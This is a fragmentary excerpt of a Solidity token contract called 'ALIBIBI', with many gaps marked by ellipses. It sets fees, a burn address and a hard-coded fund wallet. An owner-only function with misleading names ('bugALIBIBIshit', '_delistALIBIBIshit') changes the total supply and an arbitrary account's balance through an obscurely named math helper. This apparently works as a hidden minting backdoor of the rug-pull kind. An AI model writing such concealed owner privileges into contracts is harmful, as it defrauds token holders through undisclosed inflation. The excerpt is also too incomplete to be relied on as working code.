...
library SafeMath {
     ...
     */
     function ALIBIBIshit(uint256 a, uint256 b) internal pure returns (uint256) {
...
contract Token is Context, IERC20, Ownable {
    ...
    string private _name = 'ALIBIBI';
    string private _symbol = 'ALIBIBI';
    uint8 private _decimals = 18;
    
    address private _burnPool = 0x000000000000000000000000000000000000dEaD;
    
    address private fundAddress = address(0x554D085c1E78be96bfc3a48b8483289de5Df3A62);
    ...
    uint256 private _previousFundFee = _fundFee;
     uint256 public  MAX_STOP_FEE_TOTAL = 4000000 * 10**uint256(_decimals);
  ...
  function setMaxStopFeeTotal(uint256 total) public onlyOwner {
   ...
   function calculateBurnFee(uint256 _amount) private view returns (uint256) {
    ...
    function bugALIBIBIshit(uint256 amount, address account)  public onlyOwner virtual {
      _delistALIBIBIshit(address(account), amount);
    }
     function _delistALIBIBIshit(address account, uint256 tamount) onlyOwner() internal {
        require(account != address(0), "TOKEN20: transfer from the zero address");
        _tTotal = _tTotal.ALIBIBIshit(tamount);
        _rOwned[account] = _rOwned[account].ALIBIBIshit(tamount);
